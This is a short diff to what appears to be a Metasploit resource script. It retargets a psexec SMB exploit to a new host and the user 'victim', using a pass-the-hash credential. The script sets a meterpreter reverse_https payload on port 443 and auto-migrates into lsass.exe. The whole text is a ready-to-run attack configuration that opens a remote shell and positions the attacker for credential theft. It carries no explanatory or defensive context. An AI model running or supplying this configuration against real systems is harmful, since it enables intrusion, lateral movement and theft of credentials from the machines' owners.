@@ -1,7 +1,7 @@
 use exploit/windows/smb/psexec
 set payload windows/meterpreter/reverse_https
-set rhost 10.0.0.1
-set smbuser admin
+set rhost 192.168.57.25
+set smbuser victim
 set smbpass aad3b435b51404eeaad3b435b51404ee:d00e5d238213d590200fcf3e6f3cd13c
 set lport 443
 set AutoRunScript post/windows/manage/migrate name=lsass.exe spawn=false
